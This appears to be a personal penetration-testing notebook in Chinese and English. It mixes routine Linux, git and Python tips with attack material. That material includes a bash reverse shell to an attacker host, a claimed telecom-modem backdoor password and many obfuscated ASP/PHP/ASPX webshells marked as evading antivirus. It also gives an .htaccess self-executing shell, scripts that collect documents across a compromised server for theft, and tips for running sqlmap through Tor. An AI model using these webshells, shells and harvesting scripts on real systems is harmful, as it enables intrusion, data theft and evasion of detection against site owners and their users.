```
1.没用过的在线扫描器:
    https://jawfish.io/
	https://www.punkspider.org

    三个安全相关搜索引擎
    https://www.shodan.io/
    https://www.zoomeye.org/
    https://fofa.so/

2.使用python开启一个简单的http服务:
    python -m SimpleHTTPServer 80

3.serve U运行cmd:
    quote site exec "..."

4.账号telecomadmin密码nE7jA%5m电信猫后门

5.linux local_root提权  
    http://exploit.linuxnote.org/
    https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,
    linuxprivchecker.py,unix-privesc-check)
    https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
 windows local privileges:
    http://www.52wa.net/post-198.html
    https://github.com/GDSSecurity/Windows-Exploit-Suggester
    http://le4f.net/post/post/windows-x64-local-privilege-escalation
    https://forum.90sec.org/forum.php?mod=viewthread&tid=9067#lastpost
    https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
    http://www.freebuf.com/articles/web/76892.html
    https://github.com/foxglovesec/Potato
    in meterpreter:
    meterpreter>background
    msf>use post/multi/recon/local_exploit_suggester 
    msf>show options
    msf>exploit
    or  
    meterpreter>run post/multi/recon/local_exploit_suggester

6.metasploit与postgresql数据库连接:
    msf > db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3

7.http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱

8.bash反弹:
    /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1

9.sed -i '/Love/d' 1.txt   删除包含Love的行
  sed -i 's/pattern1/string' file    正则查找替换
  sed -ri 's/pattern1/string' file
      标准正则查找替换,上面没有r选项的正则中()或{}要加\,也即\(或\{,此处r要在i前面
      否则用sed -ir无效
  如果要替换成的字符串中有\n,且用的是python调试os.system执行sed,则要将\n变成\\n,eg:
  sed -i "s/<?php/<?php\necho 666;/g" test.php
  在python中要这样写:
  os.system('''sed -i "s/<?php/<?php\\necho 666;/g" test.php''')

  linux中批量替换目录文件中的字符串:
    sed -i "s/xinghuacai/3xp10it/g" `grep xinghuacai -rl .`
    or:
    sed -i "s#http://3xp10it.cc#http://3xp10it.cc#g" `grep xinghuacai -rl .`
    -i是直接修改,而不在屏幕输出的选项

10.加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.
(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样>>
    先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.

11.tar -T mulu.list -czf file.tar.gz

12.分割大文件再合并
    split -b 20m RevolutionOS.rmvb RevOS_part_,
    cat RevOS_part_* > RevolutionOS_RSB.rmvb,
    md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)

13.一些数据库操作
  给数据库添加一个用户
    CREATE USER 'username'@'host' IDENTIFIED BY 'password';(可小写)
    修改密码
    SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');
    修改权限
    GRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION;
    (databasename.tablename可为*.*,privileges可为all,注意databasename和tablename中不要有'.'这个标点,
    否则databasename.tablename不知道在哪儿算作分开,eg.gv32_cms5.1.9是数据库名,则会出错)

    设置允许本机所有网卡对应ip都可以被root连接命令:
    grant all privileges on *.* to root@'%' identified by '12345678' with grant option;
    12345678为root密码

14.ip:23.23.23.23    (bing)

15.暴路径http://www.lxway.com/1191778.html  
   google dork:(about error message)
       https://www.exploit-db.com/google-hacking-database/7/
       eg:"You have an error in your SQL syntax near -google -baidu -github -stackoverflow"

16.sublime text快捷键好东西:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
  ctrl+D,ctrl+shift+k,ctrl+shift+<-/->,按住shift右键拖动鼠标多行编辑,
  set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+[/],ctrl+shift+v完整粘贴源代码格式,移动一行ctrl+shift+上/下

17.nmap :
  nmap -v -sP -PI -PT -Pn 192.168.0.0/24
  nmap -v -sn -PE 192.168.0.0/24 快速扫描局域网存活主机

18.常用linux命令
   uname -a
   cat /proc/version
   head -n 1 /etc/issue   # 查看linux操作系统版本
   linux查看系统版本命令
       http://blog.csdn.net/zhuying_linux/article/details/6859286
   getconf LONG_BIT       # 查看系统是32位还是64位
   网络
   
   # ifconfig               # 查看所有网络接口的属性
   # iptables -L            # 查看防火墙设置
   # route -n               # 查看路由表
   # netstat -lntp          # 查看所有  监听端口
   # netstat -antp          # 查看所有已经建立的连接
   # netstat -s             # 查看网络统计信息

   find . -name "*vimrc*" | xargs grep -r "linebreak"
       #在当前目录下查找文件名中包含vimrc的所有文件,并在这些文件中查
       http://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cv
       e-2011-0104/http://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98
       %E4%BA%89-cve-2011-0104/找包含"linebreak"关键字的文件中的与"linebreak"相关的行

19.linux backup and restore:<sudo>
    0>http://xing.rocks/2015/03/06/ubuntu%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/ 更详细
    1>backup:
    cd /
    tar cvpzf linuxbackup.tgz --exclude=/proc --exclude=/lost+found --exclude=/linuxbackup.tgz --exclude=/mnt 
    --exclude=/sys --exclude=/root/.cache /
    2>restore:
    backup the new system's /boot and /etc/fstab
    cd /
      tar xvpfz linuxbackup.tgz -C / 
      mkdir proc  
      mdkir lost+found  
      mkdir mnt   
      mkdir sys
    restore the new system's backup's /boot and /etc/fstab
      reboot
    3>http://blog.csdn.net/shendl/article/details/7384755
    4>https://wiki.archlinux.org/index.php/Full_system_backup_with_rsync

20.python中import和from xx import xx需要注意的事:
  import语句中:import或者from xx import xx语句当中,形如a.b的
  用法如from a.b import f(f是b.py中一个函数名或者一个常量,a是一个文件夹,只有文件夹才
  可以带.后接具体文件名《如此处的b<省略.py后缀>》,在具体的函数调用而不是import语句中,文件可
  以带.后接文件中的函数或常量《如sqlmap中,在sqlmap目录下运行python,可以import tamper.sapce2comment,然
  后运行tamper.space2comment.tamper(" ajf  "),但是不可以直接运行sapce2comment.tamper(" ajf  "),这样会报错,
  而且以上两种情况都需要在tamper文件夹下面放一个__init__.py文件,里面的内容可以
  为空,如果在sqlmap目录下使用from tamper import *则需
  要在__init__.py里面加上__all__=['','',''...],其中''里面
  是tamper目录下所有模块的模块名,这样的话就可以通过from tamper import *来导入所有模块了,然后
  就可以使用如greatest.tamper("and 1>2")等的语句了》)
  各tamper详解:http://www.moonsec.com/post-422.html
  最常用--tamper=between,space2randomblank,randomcase,xforwardedfor,charencode
  大致通用between,space2randomblank,randomcase,xforwardedfor,charencode,multiplespaces,space2plus,
  nonrecursivereplacement,apostrophemask,base64encode,space2mssqlhash,space2mysqldash,unionalltounion,
  securesphere,space2comment 

21.神器lfi自动探测panoptic:https://github.com/lightos/Panoptic
    神器load_file自动探测sqlnuke:https://github.com/nuke99/sqlnuke.git

22.webshell:
  webshell generate site(good):http://www.zjjv.com/
  good:https://r57.gen.tr/
       http://www.dcvi.net/
  http://www.passwaf.com/
  http://cduan.cc/ma/index.htm
  php-b374k(PHP version > 4.3.3 and PHP 5):https://github.com/b374k
         (browser old version): https://code.google.com/p/b374k-shell/
  http://www.dcvi.net/

23.经典入侵思路:
  http://www.2cto.com/Article/201201/115793.html(伪静态注入到获得webshell)

24.cookie注入中转http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(目前认为只可asp,get)

25.vpn搭建教程(2003server)
    http://www.xfisp.com/style/info/shownews.asp?id=3(pptp)
    http://vps.gl/windows/215.html  http://help.fireinter.com/tengxunyun/2015/0203/354.html(l2tp)

26.关于ipcam的UPnP或NAT的知识http://www.pernet.tv/thread-103-1-1.html

27.google search api for python
    具体详情见百度云盘笔记文件夹

28..NET reverse tool(graywolf):https://www.digitalbodyguard.com/graywolf.html

29.linux fdisk->ext3->mount:http://cuchadanfan.blog.51cto.com/9940284/1671416

30.Cknife  java环境菜刀  已放到/usr/share

31.免杀一句话:http://blog.hacku.cn/post/260.html
           http://www.freebuf.com/articles/web/9396.html
           kali linux2.0:
            webacoo
            weevely
   asp:

		<%
		wei="日日日)""wei""(tseuqer lave 日"
		execute(UnEncode(wei))
		function UnEncode(cc)
			for i = 1 to len(cc)
				if mid(cc,i,1)<>"日" then
					temp = Mid(cc, i, 1) + temp
						else
					temp=vbcrlf&temp
						end if
						next
							UnEncode=temp
						end function
		%>


		key:iew



   <%execute(unescape("eval%20request%28%222016%22%29"))%>          key:2016

   <%
   dim a,b,temp,c
   a="eva@@l%20req@@uest%28%22helloxj%22%29"
   b=replace(a,"@@","零")
   c=split(b,"零")
   for i=0 to ubound(c)
   temp=temp+c(i)
   next
   execute(unescape(temp))
   %>
                        key:helloxj

   <%Y=request("shezhang")%><%execute(Y)%>
    
   <%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("shezhang"))%>
    
   <%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>(密码是-7)

   php:
   <?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?>       key:g
   <?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?>        key:the value of "a"
   <?php$a=str_replace(x,"","axsxxsxexrxxt");$a($_POST["shezhang"]);?>
    
   <?php$lang=(string)key($_POST);$lang($_POST['shezhang']);?>
    
   test<?php$k="ass"."ert";$k(${"_PO"."ST"}['nihao']);?>
    
   <?php $a="a"."s"."s"."e"."r"."t"; $a($_POST["shezhang"]); ?>
    
   <?php         
   @$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";         
   @$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";         
   @$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}         
   [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>  密码是 -7
   <?php 
   if(!$_POST['nihao']){header('HTTP/1.1 404 Not Found'); exit(); }
   else{ $s="p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"; @$s("~[discuz]~e",$_POST['nihao'],"Access denied"); } ?>

   
   <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
   <html><head>
   <title>404 Not Found</title>
   </head><body>
   <h1>Not Found</h1>
   <p>The requested URL was not found on this server.</p>
   </body></html>
   <?php
   ($b4dboy = $_POST['nihao']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); 
   header('HTTP/1.1 404 Not Found');
   ?>

   <?php
   include 'xxoo.jpg';
   ?>
   xxoo.jpg为一句话图片木马,此php后门中在win下菜刀连接只能看到木马所在盘符文件,
   其他盘符磁盘下文件默认在菜刀中不可加载,也看不到,但是可通过虚拟终端"dir 盘符:\"
   看到,对文件也有操作权限,在linux下可看到所有文件,该版本不被查杀

   <?php
   $file = fopen("test.php","w");
   fwrite($file,$_REQUEST[cmd]);
   fclose($file);
   ?>
   该版本不被查杀,且比上面一个更安全


   aspx:
   ASPX一句话的过安全狗效果不怎么样,不过我认为能支持aspx百分之8/90支持asp
   <%@PageLanguage=Jscript%>      
   <%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/
   "a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+      
   "[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+      
   ","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval      
   (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>  密码 -7
    
    
   <%@PageLanguage="Jscript"%><%eval(Request.Item["shezhang"],"unsafe");%>

    
    
   <scriptlanguage="C#"runat="server">      
   WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y("add6bb58e139be10");      
   </script>                              密码是webadmin

   aspx隐藏一句话新:
   http://z-cg.com/?mod=pad&act=view&id=10
   (<%WebServices.ShowRunnerVersion();%>,<%WebServices.InitializeWebServices("fuck");%>)

32.phpstudy for linux:
  wget -c http://lamp.phpstudy.net/phpstudy.bin
  chmod +x phpstudy.bin
  # 权限设置
  ./phpstudy.bin     #运行安装
      php版本切换也是用这个命令,选择mysql不安装

  服务进程管理:phpstudy (start|stop|restart|uninstall)
  站点主机管理:phpstudy (add|del|list)
  ftpd用户管理:phpstudy ftp (add|del|list)

33.strem:http://www.yxbao.com/bd/27803.html#goDown

34.linux的git使用:
  http://www.linuxidc.com/Linux/2014-02/96989.htm
  完成密钥的设置后:
  git init
  git add .
  git commit -a -m "xxx"<没有这一步会显示error>
  git remote add origin url
  git push -u origin master

  更新部分文件时,提交更新:
  git add file(changed file or new file,the command 'git add' means add file to local git repositories)
  git status(check is the file status is ok)
  git commit -a -m "something"(without commit command can not update the file,this is a 'must')
  git push -u origin master


  新建本地git仓库时,添加文件:(要先pull下来tar_url的文件到新建的文件夹,然后将要提交的文件复制到新建文件夹中,
  如果先把要提交的新文件放到新建的文件夹下再进行如下一串命令,将提示出错)
  git init(在随便新建的一个文件夹下)
  git pull tar_url(该条命令执行后用新文件替换旧文件)
  git status
  git add newfile (git add .)
  git commit -a -m "xxx"
  git remote add origin tar_url
  git push -u origin master                                               
  -----------------------
  如果同1个github帐号有2台机器操作相同的项目(家里一台,上班一台),github.com上项目是最新版本,要在新电脑上(eg,上班的电脑)继续这个项
  目:
  git clone https://github.com/..../xxx.git(新电脑本地没有这个项目时需要运行)
  自行更新需要更新的文件
  git add .
  git commit -a -m "up"
  git push -u origin master

  删除所有历史版本中的敏感文件
  cd /tmp
  mkdir 3xp10it
  cd 3xp10it
  git init 
  git pull https://github.com/3xp10it/3xp10it.git
  git filter-branch --tree-filter 'rm -f config.ini'

  github多人协作
  https://gist.github.com/suziewong/4378619

  git pull<==>svn update
  git push -u origin master<==>svn commit

  git有本地仓库和远程仓库,svn只有远程仓库

  git本地误删除一个文件,怎样从github上拉回
  https://segmentfault.com/q/1010000004227370
  http://blog.csdn.net/qq_15437667/article/details/52762196
  http://blog.csdn.net/iaiti/article/details/39557951

  git常用命令
  http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html

35.生活学习:1>(本杰明-富兰克林13条)http://www.201980.com/lizhi/chenggong/9386.html
             2>(曾国藩修身12条)http://www.201980.com/lizhi/chenggong/8007.html

36.mouse without borders:多屏幕同键盘鼠标控制
              https://www.microsoft.com/en-us/download/confirmation.aspx?id=35460(win)
              http://alternativeto.net/software/mouse-without-borders2/?platform=linux(linux)
              x2vnc(目前认为最好,通过vnc达到mouse without borders的功能!!)

37.java执行jar文件命令:java -jar xx.jar

38..htaccess can be :
  1>
  <FilesMatch "haha">
  SetHandler application/x-httpd-php
  </FilesMatch>
  2>
  <Files demo.jpg>
  ForceType application/x-httpd-php
  SetHandler application/x-httpd-php
  </Files>
  3>自解析.htaccess
    -----------------------自解析.htaccess--------------------------------
    # Self contained .htaccess web shell - Part of the htshell project
    # Written by Wireghoul - http://www.justanotherhacker.com

    # Override default deny rule to make .htaccess file accessible over web
    <Files ~ "^\.ht">
    Order allow,deny
    Allow from all
    </Files>

    # Make .htaccess file be interpreted as php file. This occur after apache has interpreted
    # the apache directoves from the .htaccess file
    AddType application/x-httpd-php .htaccess

    ###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
    -----------------------自解析.htaccess--------------------------------

39.临时的一种暴路径思路:netsparker扫出有输入的php页面及输入变量名,然后用awvs里面的fuzz功能fuzz,得到暴错的路径,可试.

40.(command1 & command2)==(command1;command2)    
command1 && command2中,如果command1不成功,command2则不会执行,(command1 & command2)或(command1;command2)中如果command1不成功,command1会执行
locate *.doc > doc.list && locate *.docx > docx.list && locate *.pdf > pdf.list && locate *.txt > txt.list && locate *.xls > xls.list && locate *.xlsx > xlsx.list && locate *.jpg > jpg.list && locate *.png > png.list
tar -czf code.tar.gz * && tar -T doc.list -czf doc.tar.gz && tar -T docx.list -czf docx.tar.gz && tar -T pdf.list -czf pdf.tar.gz && tar -T txt.list -czf txt.tar.gz && tar -T xls.list -czf xls.tar.gz && tar -T xlsx.list -czf xlsx.tar.gz && tar -T jpg.list -czf jpg.tar.gz && tar -T png.list -czf png.tar.gz
   
   or when there exist the same ip but different site:

find -regex ".*\.\(doc\|docx\)" > doc.list && find -regex ".*\.pdf" > pdf.list && find -regex ".*\.txt" > txt.list && find -regex ".*\.\(xls\|xlsx\)" > xls.list && find -regex ".*\.\(jpg\|png\)" > jpg.list    
///find . -regex "xxx"   (.)  .  can be used or not while they both mean find the current path
///sometimes the system may not support && to execute "find",then we should execute above find command without "&&" and find them one by one
///or maybe sometimes the system may not support -regex in find command
///or maybe sometimes the system may not support without path command with find,use . or ./ better any time find the current path 
then the better answer:
find . -name "*.doc" > doc.list && find . -name "*.docx" > docx.list && find . -name "*.pdf" > pdf.list && find . -name "*.txt" > txt.list && find . -name "*.xls" > xls.list && find . -name "*.xlsx" > xlsx.list && find . -name "*.jpg" > jpg.list && find . -name "*.png" > png.list
tar -czf code.tar.gz * && tar -T doc.list -czf doc.tar.gz && tar -T docx.list -czf docx.tar.gz && tar -T pdf.list -czf pdf.tar.gz && tar -T txt.list -czf txt.tar.gz && tar -T xls.list -czf xls.tar.gz && tar -T xlsx.list -czf xlsx.tar.gz && tar -T jpg.list -czf jpg.tar.gz && tar -T png.list -czf png.tar.gz
///however,i found that "&&" or "||" are both not the best,coz command "a && b" means only command "a" execute successly,then "b" can execute
///comman "a || b" means if "a" execute successly,then "b" will not execute
///but comman "a;b" means "a" and "b" will both execute,no mater the former "a" execute successfully or not 
so,the better and beeter combine command is:
find . -name "*.doc" > doc.list;find . -name "*.docx" > docx.list;find . -name "*.pdf" > pdf.list;find . -name "*.txt" > txt.list;find . -name "*.xls" > xls.list;find . -name "*.xlsx" > xlsx.list;find . -name "*.jpg" > jpg.list;find . -name "*.png" > png.list
tar -czf code.tar.gz *;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz

recently I found command1;command2 performs not good to search all files in webshell's upon commonds,better to execute comman1 && command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:

find . -name "*.doc" > doc.list && find . -name "*.docx" > docx.list && find . -name "*.pdf" > pdf.list && find . -name "*.txt" > txt.list && find . -name "*.xls" > xls.list && find . -name "*.xlsx" > xlsx.list
tar -T doc.list -czf doc.tar.gz && tar -T docx.list -czf docx.tar.gz && tar -T pdf.list -czf pdf.tar.gz && tar -T txt.list -czf txt.tar.gz && tar -T xls.list -czf xls.tar.gz && tar -T xlsx.list -czf xlsx.tar.gz

or:
mkdir /tmp/tmp
PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo '''find / -name "*.doc" > /tmp/tmp/doc.list && find / -name "*.docx" > /tmp/tmp/docx.list && find / -name "*.pdf" > /tmp/tmp/pdf.list && find / -name "*.txt" > /tmp/tmp/txt.list && find / -name "*.xls" > /tmp/tmp/xls.list && find / -name "*.xlsx" > /tmp/tmp/xlsx.list''' > /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping > /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz && tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz && tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz && tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz && tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz && tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz

sometimes when try to execute in this way:
PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo '''find / -name "*.doc" > /tmp/tmp/doc.list && find / -name "*.docx" > /tmp/tmp/docx.list && find / -name "*.pdf" > /tmp/tmp/pdf.list && find / -name "*.txt" > /tmp/tmp/txt.list && find / -name "*.xls" > /tmp/tmp/xls.list && find / -name "*.xlsx" > /tmp/tmp/xlsx.list''' > /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping > /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1

may found it didn't succeed to create list file except for doc.list,then try useing normal webshell's terminal to execute the one without root privilege in one of upon ways


windows:
find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo "yes" | for /r f:\ %i in (*.doc,*.docx,*.pdf,*.xls,*.xlsx,*.txt) do copy "%i" f:\web_r
c:\recycler\rar.exe a -k -r -s -m1 c:\recycler\tmp\tmp.rar c:\recycler\tmp\*.*
7z.exe a -t7z -p123456 c:\test.7z c:\test\*.*
del /f/q folder
rar a /v20m /m0 newfilename web.rar
windows find web.config==>for /r c:\http\ %i in (web.conf?g) do (echo *****filepath***** >> tmp.txt && echo %i >> tmp.txt && type "%i" >> tmp.txt >> tmp.txt && echo. >> tmp.txt)
windows bat批处理for用法:http://blog.csdn.net/wh_19910525/article/details/7912440


windows找文件命令:
for /f %j in ('dir /b /s "c:\MSCOMCTL.O?X"') do (echo %j)
windows找文件中的字符串命令:
findstr /R ".*sa.*" c:\1\* > tmp.txt

powershell:dir –r | select-string "root"

windows打包(7z)命令:1.bat
---------------content of 1.bat--------------------------
@echo off
goto :main
这是注释:(for /f "delims="的作用为取消默认的以空格等符号作为分割符
dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
:main
set str=c d e f g h i j k l m n o p q r s t u v w x y z 
rd /s/q c:\recycler\tmp
md c:\recycler\tmp
echo  当前硬盘的分区有: 
for %%i in (%str%) do (
if exist %%i: (echo %%i:

for /f "delims=" %%j in ('dir /b /s "%%i:\*.doc"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> tmp.txt
)

for /f "delims=" %%j in ('dir /b /s "%%i:\*.docx"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


for /f "delims=" %%j in ('dir /b /s "%%i:\*.pdf"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


for /f "delims=" %%j in ('dir /b /s "%%i:\*.txt"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


for /f "delims=" %%j in ('dir /b /s "%%i:\*.xls"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


for /f "delims=" %%j in ('dir /b /s "%%i:\*.xlsx"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


)
)

7z a -t7z C:\recycler\tmp\test.7z C:\recycler\tmp\*.*
------------------end--------------------------------

linux打包命令:1.sh(attention:without "&& echo ok",the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
-----------------content of 1.sh--------------------
mkdir /tmp/tmp && find / -name "*.doc" > /tmp/tmp/doc.list && find / -name "*.docx" > /tmp/tmp/docx.list && find / -name "*.pdf" > /tmp/tmp/pdf.list && find / -name "*.txt" > /tmp/tmp/txt.list && find / -name "*.xls" > /tmp/tmp/xls.list && find / -name "*.xlsx" > /tmp/tmp/xlsx.list && tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz && tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz && tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz && tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz && tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz && tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz && echo ok
    --------------------end-----------------------------

41.kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network

42.http://www.orico.com.cn/   driver    

43.python中单引号,双引号,三引号http://blog.csdn.net/caianye/article/details/6638183       

45.os.system('''python %s >> "out_log.txt"''' % exp_path) ">>" instead of "open(file,"a+") fp.write(str)" in py2 or py3

46.others' tips:  
   msf必不可少burpsuite/fiddler必不可少python,ruby,shell,perl必不可少,不会编程还是别玩了.
   c/c++/java能看懂写小东西,这几个得熟练nmap,sqlmap,niktoida常备dropbox,evernote常备还有啥呢?
   成形的工具只能用于通用检测,针对具体对象,还需要写些自己的工具,另外准备些有针对性的基础库,字典啥的,经常干这个都知道先想到这些,稍后再补充,再紧张干活中…….

47.google-chrome-stable on kali linux2.0
   adding --user-data-dir
   and open terminal : /usr/bin/google-chrome-stable %U --no-sandbox  or cd /usr/share/applications edit Google Chrome by right mouse,add     %U --no-sandbox

48.sqlmap with tor:http://navisec.it/%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8sqlmap/
   sqlmap --tor --tor-type=socks5 [--tor-port=9050] --check-tor
   sqlmap --proxy=socks5://127.0.0.1:9050
   sqlmap --proxy=socks5://127.0.0.1:9050 --proxy-cred=admin:pass

   sqlmap中--technique=Q 是inline query的查询方式

49.tor的笔记:
   1>apt-get install tor安装的tor默认端口是9050,开机自启动tor:vim /etc/rc.local,在exit 0前加上service tor start,和proxychains搭配使用时设置proxychains.conf里面的端口为9050
   2>Tor-Browser洋葱浏览器自带tor,每次启动tor-browser时,它会启动它自带的tor,该tor默认端口是9150(老版本的是9050)
   3>1中的tor和2中的tor功能完全一样,proxychains firefox等程序时对应的proxychains.conf里面的端口为9050,启动tor-browser浏览器后可用也可将proxychains.conf中端口改为9150,但tor-browser关闭后proxychains这样的代理设置会失效.

50.Python Unicode与中文处理:http://my.oschina.net/u/201886/blog/64692

51.shadow copy神器,可以复制使用中的文件,可拷贝数据库
   pwdump也可以:
   http://www.2cto.com/article/201008/55565.html

52.php中的header()函数 http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html

53.php中{}的功能 http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq

54.php上传中%00截断的理解:
   python脚本中:
   def hex_to_asc(ch):
       return '{:c}'.format(int(float.fromhex(ch)))

   for i in range(100):
       s = '%02d' % i
       print "s:%s,hex_to_asc(s):%s" % (s,hex_to_asc(s))
   可以得到如下结果:
   s:00,hex_to_asc(s):NULL
   s:01,hex_to_asc(s):
   s:02,hex_to_asc(s):
   ...
   s:29,hex_to_asc(s):)
   s:30,hex_to_asc(s):0
   s:31,hex_to_asc(s):1
   s:32,hex_to_asc(s):2
   s:33,hex_to_asc(s):3
   s:34,hex_to_asc(s):4
   s:35,hex_to_asc(s):5
   s:36,hex_to_asc(s):6
   s:37,hex_to_asc(s):7
   s:38,hex_to_asc(s):8
   s:39,hex_to_asc(s):9
   s:40,hex_to_asc(s):@
   s:41,hex_to_asc(s):A
   s:42,hex_to_asc(s):B
   s:43,hex_to_asc(s):C
   s:44,hex_to_asc(s):D
   s:45,hex_to_asc(s):E
   s:46,hex_to_asc(s):F
   s:47,hex_to_asc(s):G
   s:48,hex_to_asc(s):H
   s:49,hex_to_asc(s):I
   s:50,hex_to_asc(s):P
   s:51,hex_to_asc(s):Q
   s:52,hex_to_asc(s):R
   s:53,hex_to_asc(s):S
   s:54,hex_to_asc(s):T
   s:55,hex_to_asc(s):U
   s:56,hex_to_asc(s):V
   s:57,hex_to_asc(s):W
   s:58,hex_to_asc(s):X
   s:59,hex_to_asc(s):Y
   s:60,hex_to_asc(s):`
   s:61,hex_to_asc(s):a
   s:62,hex_to_asc(s):b
   ascii码对照表中情况:
   标准I表:
   bin          dec          hex          缩写/字符                 解释
   0000 0000    0            00           NUL(null)                空字符
   0000 0001    1            01           SOH(start of headline)   标题开始
   ...
   0010 0000    32           20           (space)                  空格
   00110000     48           30           0
   01000001     65           41           A
   01100001     97           61           a
   在计算机中,所有的数据在存储和运算时都要使用二进制数表示(因为计算机用高电平和低电平分别表示1和0),例如,像a、b、c、d这样的52个字母(包括大写)、以及0、1等数字还有一些常用的符号(例如*、#、@等)在计算机中存储时也要使用二进制数来表示,而具体用哪些二进制数字表示哪个符号,当然每个人都可以约定自己的一套(这就叫编码),而大家如果要想互相通信而不造成混乱,那么大家就必须使用相同的编码规则,于是美国有关的标准化组织就出台了ASCII编码,统一规定了上述常用符号用哪些二进制数来表示.
   个人理解成ascii码只是一个对照关系,如果硬说ascii是多少,则把ascii码值当作"缩写/字符"一栏对应的值,
   即二进制(01000001)对应二进制(65)对应十六进制(41),而它们对应的ascii码为键盘上的可控字符"A",
   所以%00截断时的下面两种情况:
   1.在url中加入%00,如http://xxoo/shell.php%00.jpg
